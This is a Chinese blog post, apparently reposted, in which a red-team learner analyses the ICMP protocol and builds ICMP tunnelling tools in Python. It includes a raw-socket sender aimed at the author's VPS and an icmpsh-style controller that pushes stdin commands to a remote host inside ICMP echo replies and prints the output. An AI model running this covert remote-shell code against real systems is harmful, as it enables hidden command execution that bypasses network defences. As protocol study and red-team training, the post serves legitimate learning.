<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7-_6n1bnSZZIgcMd6KxDjA)

> 打红队时导师要求学习的一个icmpshell，对协议进行简单分析

> ICMP协议既不是基于TCP，也不是基于UDP，而是直接基于网络层的IP协议，在整个网络协议栈中属于相当底层的协议了。

ICMP数据包封装过程
-----------

![图片](https://mmbiz.qpic.cn/mmbiz_png/GIRBFLSfaJIKx000mJWH8ZU5l8dYoPic5d9hNUMOEc0rY9rOqYQBrdPzDJQKlgGZQ75GeeFLuWZEwSJ5akVoYrA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

ICMP头部分为三个字段

*   type 类型 （0回应，8请求）
    
*   code 代码
    
*   checksum 校验和
    

![图片](https://mmbiz.qpic.cn/mmbiz_png/GIRBFLSfaJIKx000mJWH8ZU5l8dYoPic53WmaQglQqjdoLic6mZqqUhxMTxQD9dNA5sFpAeKicb4GO25mw8GbiaKFw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

所以在封装ICMP报文的时候也要按顺序去封装这几个字段

其余部分三个部分为为

*   标识符 ( identifier )，一般填写进程 PID 以区分其他 ping 进程；
    
*   报文序号 ( sequence number )，用于编号报文序列；
    
*   数据 ( data )，可以是任意数据；
    

ICMP协议在实际传输中数据包：**20字节IP首部 + 8字节ICMP首部+ 1472字节<数据大小>38字节**  
ICMP首部细分为8位类型+8位代码+16位校验和+16位标识符+16位序列号

![图片](https://mmbiz.qpic.cn/mmbiz_png/GIRBFLSfaJIKx000mJWH8ZU5l8dYoPic5nNYia16eKfP4QIPSia7qafnqIGPj2lADMeIfnvOES4AguzDemYer0frA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

所以说构造ICMP包要分两部分构造：IP首部和ICMP的数据

### ICMP隧道的原理

即是把原本其他协议内容通讯，放在**选项数据**位置，从而伪装成一个ICMP进行通信

从wirehark查看包结构：

![图片](https://mmbiz.qpic.cn/mmbiz_png/GIRBFLSfaJIKx000mJWH8ZU5l8dYoPic5p1LGhjvBFZdBn78PSKymjmPHb8icySRev7AYKQWSfs1Gj9iaEWl4EWtQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

ICMP数据：

所以从上到下分别为：

*   物理层
    
*   链路层
    
*   网络层
    

第三行是IP首部 第四行是ICMP数据

#### 物理层

![图片](https://mmbiz.qpic.cn/mmbiz_png/GIRBFLSfaJIKx000mJWH8ZU5l8dYoPic5aETL8nlWskhKfLL8gVosFvmsibHHSHpdDdFft0eGlG52BP9180Hrr4w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

#### 链路层

![图片](https://mmbiz.qpic.cn/mmbiz_png/GIRBFLSfaJIKx000mJWH8ZU5l8dYoPic5ICojibtdy8c0aMsr4d5UFptbxF11rxFS5x1bLZNiae8N4mr5Uz63fG7w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

#### 网络层

IP首部：  
![图片](https://mmbiz.qpic.cn/mmbiz_png/GIRBFLSfaJIKx000mJWH8ZU5l8dYoPic59RkCv87XcRHGrCgBfqUFTq0y4BZn1gbETMnMIB98KwdN5piaeA8eNng/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

ICMP报文：  
![图片](https://mmbiz.qpic.cn/mmbiz_png/GIRBFLSfaJIKx000mJWH8ZU5l8dYoPic5ibYrwHy7sNbRS0IyNh3nz6ZEsMb7fNmead3wpEatXZvN4ibZkYVlcY3A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

利用python做一个通讯工具
---------------

### 基本思路

1.  利用struct库将6个字段封装
    
2.  socket发送数据包
    
3.  定义一个函数去计算校验和（网上照抄即可）
    

#### 流程一：构造报文发包

```


1.  `import struct      #用于 封装网络报文 的工具`
    
2.  `from socket import socket,AF_INET,SOCK_RAW,IPPROTO_ICMP    #套接字，收发ICMP报文`
    
3.    
    
4.  `def checksum(packet):      #packet为icmp头部和data的字节流，其中icmp校验和字段初始化为0`
    
5.   `sum = 0`
    
6.   `countTo = (len(packet)//2)*2`
    
7.   `count = 0`
    
8.   `while count < countTo:`
    
9.   `sum += ((packet[count+1] << 8) | packet[count])`
    
10.   `count += 2`
    
11.    
    
12.   `if countTo < len(packet):`
    
13.   `sum += packet[len(packet)-1]`
    
14.   `sum = sum & 0xffffffff`
    
15.   `sum = (sum >> 16) + (sum & 0xffff)`
    
16.   `sum = sum + (sum >> 16)`
    
17.   `answer = ~sum`
    
18.   `answer = answer & 0xffff`
    
19.   `answer = answer >> 8 | (answer << 8 & 0xff00)`
    
20.   `return answer`
    
21.    
    
22.    
    
23.  `def send(ip):`
    
24.   `raw = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)`
    
25.   `packet = struct.pack('!BBHHH8s',8,0,0,1,0,b'qaxnb!!!')`
    
26.   `checkedsum = checksum(packet)`
    
27.   `packet = struct.pack('!BBHHH8s',8,0,checkedsum,1,0,b'qaxnb!!!')`
    
28.   `raw.sendto(packet,(ip,0))`
    
29.   `return raw`
    
30.    
    
31.    
    
32.  `send('159.75.86.36')`
    
33.    
    


```

这段代码 向我的vps发送一个我构造的ICMP包

#### 流程二：接收返回的ICMP包

```


1.  `import struct`
    
2.  `from socket import *`
    
3.  `while True:`
    
4.   `s=socket(AF_INET, SOCK_DGRAM,IPPROTO_ICMP)`
    
5.   `s.bind(('',0))`
    
6.   `m = s.recv(1024)`
    
7.   `print(m)`
    


```

main.py发送一个icmp包，receive.py接收数据包：

> 因为icmp包的特性，我发送一个type = 8 （请求）数据包，目标机器会返回一个type = 0 （应答）的数据包，所以receive.py可以接收到报文

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

接下来的思路是将返回的ICMP包解包，提取data数据并且print，初步实现一个单向通信工具  
b’E`\x10\x00^\x1e\x00\x006\x01\xc6\xee\x9fKV$dd\x05\x99\x00\x00\x92\xec\x00\x01\x00\x00qaxnb!!!' b'E`\x10\x00-\xc6\x00\x006\x01\xf7F\x9fKV’

#### 实现一

icmpshell

这篇文章有一个比较传统的构造数据包的思路，但是icmpsh的思路更好，用py模块调用构造数据包，只需要按照调用参数依次填写即可，原理是服务端发包

参考icmpsh 实现服务端发包代码：

```


1.  `# -*- codeing = utf-8 -*-`
    
2.  `# @time : 2021/8/23 12:33 下午`
    
3.  `# @Author : WenD1l`
    
4.  `# @File : icmp_new.py`
    
5.  `# @Software开发环境 : PyCharm`
    
6.  `import socket`
    
7.  `import sys`
    
8.  `import select`
    
9.  `from impacket import ImpactPacket, ImpactDecoder`
    
10.  `import fcntl`
    
11.  `import os`
    
12.    
    
13.    
    
14.  `# 这个类控制icmp包`
    
15.  `def icmp_build(dst_ip):`
    
16.   `# 实例化一个icmp数据包对象`
    
17.   `icmpcmd = ImpactPacket.ICMP()`
    
18.   `icmpcmd.set_icmp_type(icmpcmd.ICMP_ECHOREPLY)`
    
19.    
    
20.   `# 实例化一个ip数据包，设置源和目标地址`
    
21.   `ip = ImpactPacket.IP()`
    
22.   `ip.set_ip_src('0.0.0.0')`
    
23.   `ip.set_ip_dst(dst_ip)`
    
24.    
    
25.   `# 利用socket为icmp打开socket`
    
26.   `sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)`
    
27.   `sock.setblocking(False)`
    
28.    
    
29.   `# 通过setsockopt函数来设置数据保护IP头部,IP头部我们就可以接收到`
    
30.   `sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)`
    
31.    
    
32.   `stdin_fd = sys.stdin.fileno()`
    
33.   `setNonBlocking(stdin_fd)`
    
34.    
    
35.   `# 实例化IP数据包解码器`
    
36.   `decoder = ImpactDecoder.IPDecoder()`
    
37.   `# 接收传入并且解码`
    
38.   `while True:`
    
39.   `if sock in select.select([sock], [], [])[0]:`
    
40.    
    
41.   `replies = sock.recv(4096)`
    
42.   `ippacket = decoder.decode(replies)`
    
43.   `icmppacket = ippacket.child()`
    
44.   `# 获取icmp包信息`
    
45.   `ident = icmppacket.get_icmp_id()`
    
46.   `seq_id = icmppacket.get_icmp_seq()`
    
47.   `data = icmppacket.get_data_as_string()`
    
48.   `sys.stdout.write(data)`
    
49.   `# 设置新的icmp包`
    
50.   `icmpcmd.set_icmp_id(ident)`
    
51.   `icmpcmd.set_icmp_cksum(0)`
    
52.   `icmpcmd.auto_checksum = 1`
    
53.   `cmd = sys.stdin.readline()`
    
54.   `icmpcmd.contains(ImpactPacket.Data(cmd))    #把标准输入的命令放进data`
    
55.   `# 让ip数据包包含icmp包`
    
56.   `ip.contains(icmpcmd)`
    
57.   `# 发送数据包`
    
58.   `sock.sendto(ip.get_packet(),(dst_ip, 0))`
    
59.    
    
60.    
    
61.  `def setNonBlocking(fd):`
    
62.   `# 使文件描述符非阻塞`
    
63.   `flags = fcntl.fcntl(fd, fcntl.F_GETFL)`
    
64.   `flags = flags | os.O_NONBLOCK`
    
65.   `fcntl.fcntl(fd, fcntl.F_SETFL, flags)`
    
66.    
    
67.  `if __name__ == '__main__':`
    
68.    
    
69.   `icmp_build(sys.argv[1])`
    
70.    
    


```

icmpsh与icmpdoor都是 服务端主动向客户端发送请求，然后接受返回包获得数据  
应用场景：正向icmpshell 外网可以进icmp流量，内网icmp流量出不去

#### icmpdoor流量分析：

服务端命令：  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
客户端命令：  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

正常执行命令：  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
流量分析：  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
下面的reply里面依次返回命令执行后的数据

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)